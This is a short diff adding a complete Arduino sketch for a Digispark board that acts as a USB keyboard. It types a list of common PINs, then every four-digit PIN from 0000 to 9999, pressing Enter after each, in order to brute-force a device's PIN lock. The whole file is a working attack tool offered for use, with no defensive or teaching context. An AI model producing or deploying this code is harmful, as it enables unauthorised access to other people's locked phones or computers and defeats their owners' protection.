@@ -1,0 +1,57 @@
+/*  Digispark rubber-ducky
+    1. favourite PINs (common ones) – edit here
+    2. brute 0000-9999, skip duplicates
+    3. ENTER after every PIN, no delay()
+*/
+#include "DigiKeyboard.h"
+
+/* ----------  put your “common” PINs here  ---------- */
+const char favourites[][5] PROGMEM = {
+  "0000","1111","1234","2222","3333","4444","5555",
+  "6666","7777","8888","9999","1212","1004","6969","2000"
+};
+const uint8_t FAV_CNT = sizeof(favourites)/5;
+/* --------------------------------------------------- */
+
+inline void sendPIN(const char *pin) {
+  DigiKeyboard.print(pin);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void setup() {
+  pinMode(1, OUTPUT);
+  digitalWrite(1, LOW);
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);     // release all
+}
+
+void loop() {
+  /* 1. fire favourites */
+  for (uint8_t i = 0; i < FAV_CNT; ++i) {
+    char tmp[5];
+    memcpy_P(tmp, favourites[i], 5);
+    sendPIN(tmp);
+  }
+
+  /* 2. brute 0000-9999, skip favourites */
+  for (uint16_t n = 0; n <= 9999; ++n) {
+    char buf[5];
+    buf[0] = '0' + (n / 1000) % 10;
+    buf[1] = '0' + (n / 100)  % 10;
+    buf[2] = '0' + (n / 10)   % 10;
+    buf[3] = '0' +  n         % 10;
+    buf[4] = 0;
+
+    bool skip = false;
+    for (uint8_t i = 0; i < FAV_CNT && !skip; ++i) {
+      char fav[5];
+      memcpy_P(fav, favourites[i], 5);
+      if (!memcmp(buf, fav, 4)) skip = true;
+    }
+    if (!skip) sendPIN(buf);
+  }
+
+  /* done – LED on, halt */
+  digitalWrite(1, HIGH);
+  for (;;) {}
+}
